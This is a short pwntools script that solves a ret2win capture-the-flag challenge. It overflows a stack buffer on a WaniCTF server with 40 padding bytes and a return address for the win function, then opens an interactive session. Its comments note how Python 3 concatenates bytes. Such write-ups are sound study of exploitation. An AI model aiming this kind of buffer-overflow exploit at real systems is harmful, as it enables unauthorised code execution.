from pwn import *

# Same syntax as python2
# Load Context, binary, libc
context.terminal = ['tmux','splitw' ,'-h']

p = remote('ret2win-pwn.wanictf.org', 9003)
#p = process("./chall")
#p = gdb.debug('./chall')

win = p64(0x401369)

# python3 doesn't like concatenating differing data types within a variable, python3
# WRONG: payload = str + bytes  # Concats different datatypes in variable, python2
# RIGHT: str = b'hello'
#        bytes = b'\x41\x41'
#        payload = str + byte   # Concats variables with different datatypes.
#        p.sendline(payload)
#
junk = b'A' * 40

p.recvline()
p.sendline(junk + win)

p.recvline()
p.interactive()
